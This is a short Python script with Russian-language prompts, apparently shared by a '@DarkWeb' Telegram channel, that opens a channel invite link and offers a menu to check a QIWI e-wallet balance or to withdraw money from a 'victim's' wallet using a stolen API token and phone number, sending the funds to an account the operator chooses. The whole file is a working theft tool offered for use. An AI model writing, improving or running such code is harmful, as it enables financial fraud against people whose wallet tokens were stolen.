from SimpleQIWI import * 
import sys
from QiwiApiBySWINDLER import QiwiApi
import webbrowser as wb


print("СКРИПТ КАНАЛА: @DarkWeb!")
print("Версия: 0.1")
print("Сделанна: @SWWINDLER")


wb.open("https://t.me/+MZXRvw27MUo1ODMy")

def check_balance():
	token=input('Введите токен: ')
	phone=input('Введите номер: ')

	api = QiwiApi(token=token, phone=phone)
	print(api.get_all_profile_info())

def withdraw_money():
	token_target=input('Введите токен жертвы: ')
	phone_target=input('Введите номер жертвы: ')

	recepient_phone=input("Введите номер киви куда отправлять деньги: ")
	amount_send = input("Введите сколько отправлять: ")

	comment_text = input("Введите комментарий: ")

	api = QiwiApi(token=token_target, phone=phone_target)
	print(api.get_all_profile_info())

	api.withdraw_money(account=recepient_phone, amount=int(amount_send), comment=comment_text)
	print(api.get_all_profile_info())


def main ():
	while True:
		print("1 - Проверить баланс!") 
		print("2 - Снять деньги по токену!") 

		question = int(input("Что вы хотите сделать: "))
		try:
			if question == 1:
				check_balance()
			elif question == 2:
				withdraw_money()
			else:
				main()
		except Exception:
			print("Упс!", sys.exc_info()[0], "случилась .\n Попробуй еще")
			main()
main()
